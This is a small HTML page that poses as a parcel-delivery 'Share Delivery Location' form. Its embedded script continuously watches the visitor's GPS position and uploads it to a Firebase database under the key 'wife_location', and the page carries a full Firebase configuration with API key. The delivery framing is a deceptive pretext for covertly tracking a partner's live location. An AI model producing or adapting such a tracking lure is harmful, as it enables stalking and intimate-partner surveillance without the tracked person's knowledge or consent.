<!DOCTYPE html>
<html>
<head>
<title>Parcel Location</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
</head>

<body style="text-align:center;font-family:Arial;padding:40px">

<h1>📍Get Parcel Location</h1>

<button onclick="shareLocation()">
Share Delivery Location
</button>

<p id="result"></p>

<script type="module">

import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-database.js";


const firebaseConfig = {
  apiKey: "AIzaSyC7gRXuZc3QcUpZe_dNy0W6hg--ugogRgc",
  authDomain: "location-share-ae3aa.firebaseapp.com",
  databaseURL: "https://location-share-ae3aa-default-rtdb.firebaseio.com",
  projectId: "location-share-ae3aa",
  storageBucket: "location-share-ae3aa.firebasestorage.app",
  messagingSenderId: "1022725700035",
  appId: "1:1022725700035:web:3cb0fecc974bf0115a2576"
};


const app = initializeApp(firebaseConfig);
const db = getDatabase(app);


window.shareLocation = function(){

navigator.geolocation.watchPosition((position)=>{

let lat = position.coords.latitude;
let lon = position.coords.longitude;


set(ref(db, "wife_location"), {
latitude: lat,
longitude: lon,
time: Date.now()
});


document.getElementById("result").innerHTML =
"Location Saved ✅";


});

}

</script>

</body>
</html>
